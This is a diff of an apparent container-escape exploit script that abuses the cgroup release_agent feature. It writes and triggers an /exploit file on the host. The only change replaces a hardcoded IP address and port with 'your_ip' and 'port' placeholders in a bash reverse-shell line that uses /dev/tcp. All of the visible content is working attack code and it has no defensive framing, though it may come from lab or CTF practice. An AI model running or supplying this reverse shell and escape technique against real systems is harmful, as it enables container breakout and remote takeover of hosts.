@@ -20,7 +20,7 @@ echo "$host_path/exploit" > /tmp/cgrp/release_agent
 
 # Create the exploit script on the host
 echo '#!/bin/sh' > /exploit
-echo "/bin/bash -c 'bash -i >& /dev/tcp/10.8.135.124/1235 0>&1'" >> /exploit
+echo "/bin/bash -c 'bash -i >& /dev/tcp/"your_ip"/"port" 0>&1'" >> /exploit
 chmod a+x /exploit
 
 # Trigger the exploit by adding a process to the cgroup
